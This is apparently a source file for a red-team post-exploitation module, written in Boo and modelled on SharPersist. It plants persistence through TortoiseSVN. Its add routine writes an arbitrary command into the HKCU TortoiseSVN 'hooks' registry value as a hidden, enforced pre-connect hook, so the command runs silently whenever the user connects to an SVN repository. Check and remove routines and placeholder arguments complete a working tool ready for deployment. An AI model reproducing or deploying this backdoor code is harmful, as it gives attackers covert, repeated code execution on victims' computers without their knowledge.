/*
    This module is inspired from SharPersist (https://github.com/fireeye/SharPersist)
*/
import System
import System.Security
import Microsoft.Win32


public static def RegistryValueExists(hive_HKLM_or_HKCU as string, registryRoot as string, valueName as string) as bool:
    try:
        key as RegistryKey = null
        o as object
        registryRoot = registryRoot.Substring(5, registryRoot.Length - 5) // start after the hive specification

        // if the registry hive is HKLM
        if (hive_HKLM_or_HKCU.ToUpper().Equals("HKLM")):
            // try and open the registry key and get the value contained inside
            key = Registry.LocalMachine.OpenSubKey(registryRoot)
            o = key.GetValue(valueName)

            // if the value exists, return true
            if o:
                return true

            // if the value does not exist, return false
            else:
                return false

        // if registry hive is HKCU
        elif (hive_HKLM_or_HKCU.ToUpper().Equals("HKCU")):
            // try and open the registry key and get the value contained inside
            key = Registry.CurrentUser.OpenSubKey(registryRoot)
            o = key.GetValue(valueName)

            // if the value exists, return true
            if o:
                return true

            // if the value does not exist, return false
            else:
                return false

    except ex as NullReferenceException:
        //Console.WriteLine("[-] ERROR: Registry key provided does not exist");
        return false
    except ex as SecurityException:
        return false
    return false


public static def CanWriteKey(key as string) as bool:
    try:
        hive as string = key.Substring(0, 4) // get reg hive (HKLM, HKCU)
        registryRoot as string = key.Substring(5, key.Length - 5) // start after the hive specification

        if (hive.ToLower().Equals("hklm")):
            Registry.LocalMachine.OpenSubKey(registryRoot, true).Close(); // try and open reg key, if it fails an exception will be thrown in which case you do not have write access
        elif (hive.ToLower().Equals("hkcu")):
            Registry.CurrentUser.OpenSubKey(registryRoot, true).Close(); // try and open reg key, if it fails an exception will be thrown in which case you do not have write access
        return true

    except ex as SecurityException:
        return false
    except ex as NullReferenceException:
        print "\r\n[-] ERROR: Registry key provided does not exist"
        return false


public def initialize(command as string, commandArg as string, status as string):
   if status == "add":
       if not command:
           print "\r\n[-] ERROR: Must give a command."
           return
       addPersistence(command, commandArg)

   elif status == "remove":
       removePersistence()

   elif status == "check":
       checkPersistence(command, commandArg)

   else:
       print "[-] ERROR: Invalid method given. Must give add, remove or check."
       return


public def addPersistence(command as string, commandArg as string):
   print "\r\n[*] INFO: Adding tortoise svn persistence"
   print "[*] INFO: Command: " + command
   print "[*] INFO: Command Args: " + commandArg

   regValueExists as bool = RegistryValueExists("HKCU", "hkcu\\Software\\TortoiseSVN", "CurrentVersion")

   // if tortoise svn installed
   if (regValueExists):
       try:
           // add a pre-connect hook script, which will execute our system command any time a connection to an svn repo is made
           regUpdateVal as string = "pre_connect_hook\n \n" + command + " " + commandArg + "\nfalse\nhide\nenforce"
           Registry.CurrentUser.OpenSubKey("Software\\TortoiseSVN", true).SetValue("hooks", regUpdateVal, RegistryValueKind.String)
       except ex as NullReferenceException:
           print "\r\n[-] ERROR: Tortoise SVN registry key is not present. Are you sure that Tortoise SVN is installed?"
           return

       val as Object = Registry.CurrentUser.OpenSubKey("Software\\TortoiseSVN", true).GetValue("hooks")
       hooksVal as string = val.ToString()
       if not hooksVal:
           print "\r\n[-] ERROR: Tortoise SVN persistence failed"

       else:
           print "\r\n[+] SUCCESS: Tortoise SVN persistence added"

   // if tortoise svn not installed
   else:
       print "\r\n[-] ERROR: Tortoise SVN registry key is not present. Are you sure that Tortoise SVN is installed?"
       return


public def removePersistence():
   print "\r\n[*] INFO: Removing tortoise svn persistence\r\n"

   regValueExists as bool = RegistryValueExists("HKCU", "hkcu\\Software\\TortoiseSVN", "CurrentVersion")

   // if tortoise svn installed
   if (regValueExists):
       val as Object = Registry.CurrentUser.OpenSubKey("Software\\TortoiseSVN", true).GetValue("hooks")
       hooksVal as string = val.ToString()

       if hooksVal:
           try:
               // clear out hooks reg value
               Registry.CurrentUser.OpenSubKey("Software\\TortoiseSVN", true).SetValue("hooks", "", RegistryValueKind.String)
           except ex as NullReferenceException:
               print "\r\n[-] ERROR: Tortoise SVN registry key is not present. Are you sure that Tortoise SVN is installed?"
               return

           val = Registry.CurrentUser.OpenSubKey("Software\\TortoiseSVN", true).GetValue("hooks")
           hooksVal = val.ToString()
           if not hooksVal:
               print "[+] SUCCESS: Tortoise SVN persistence removed"

           else:
               print "\r\n[-] ERROR: Tortoise SVN persistence not removed"
       else:
           print "\r\n[-] ERROR: Tortoise SVN registry key is not present. Are you sure that Tortoise SVN is installed?"
           return

   else:
       print "\r\n[-] ERROR: No data currently in TortoiseSVN hooks registry value to remove."
       return


public def checkPersistence(command as string, commandArg as string):
   print "\r\n[*] INFO: Checking if TortoiseSVN registry key exists"

   regValueExists as bool = RegistryValueExists("HKCU", "hkcu\\Software\\TortoiseSVN", "CurrentVersion")

   if (regValueExists):
       print "[+] SUCCESS: TortoiseSVN registry key present"

       print "\r\n[*] INFO: Checking if TortoiseSVN backdoor present in hooks value"

       val as Object = Registry.CurrentUser.OpenSubKey("Software\\TortoiseSVN", true).GetValue("hooks")
       hooksVal as string = val.ToString()
       if not hooksVal:
           print "[+] SUCCESS: No data currently in TortoiseSVN hooks registry value"
       else:
           print "[-] ERROR: Value already exists in TortoiseSVN hooks registry value"

   // if the reg value doesn't exist
   else:
       print "[-] ERROR: TortoiseSVN registry key is NOT present"

   print "\r\n[*] INFO: Checking if you can write to that registry location"

   canWrite as bool = CanWriteKey("hkcu\\Software\\TortoiseSVN")

   if (canWrite):
       print "[+] SUCCESS: You have write permissions to that registry key"

   else:
       print "[-] ERROR: You do NOT have write permissions to that registry key"

   print "\r\n[*] INFO: Checking for correct arguments given"

   if not command:
       print "[-] ERROR: Must give a command."
       return

   print "[+] SUCCESS: Correct arguments given"


public static def Main():
    command = "COMMAND"
    commandArg = "COMMANDARG"
    status = "STATUS"

    initialize(command, commandArg, status)
